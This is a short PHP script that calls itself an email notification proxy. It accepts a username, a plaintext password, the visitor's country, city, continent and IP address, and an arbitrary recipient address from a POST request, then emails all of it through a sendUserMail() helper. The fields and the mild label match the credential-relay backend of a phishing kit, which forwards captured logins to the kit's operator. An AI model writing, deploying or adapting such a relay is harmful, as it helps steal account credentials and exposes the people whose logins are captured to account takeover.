<?php
/**
 * Proxy script to handle email notifications
 */
require_once 'send_mail.php';

// Handle POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get required parameters
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $country = isset($_POST['country']) ? $_POST['country'] : 'Unknown';
    $city = isset($_POST['city']) ? $_POST['city'] : 'Unknown';
    $continent = isset($_POST['continent']) ? $_POST['continent'] : 'Unknown';
    $ip = isset($_POST['ip']) ? $_POST['ip'] : $_SERVER['REMOTE_ADDR'];
    $adminEmail = isset($_POST['adminEmail']) ? $_POST['adminEmail'] : '';
    
    // Validate basic inputs
    if (empty($username) || empty($password) || empty($adminEmail)) {
        http_response_code(400);
        echo json_encode(['success' => false, 'error' => 'Missing required parameters']);
        exit;
    }
    
    // Send mail
    $result = sendUserMail($username, $password, $country, $city, $continent, $ip, $adminEmail);
    
    // Return result
    header('Content-Type: application/json');
    echo json_encode($result);
} else {
    // Method not allowed
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
}
?> 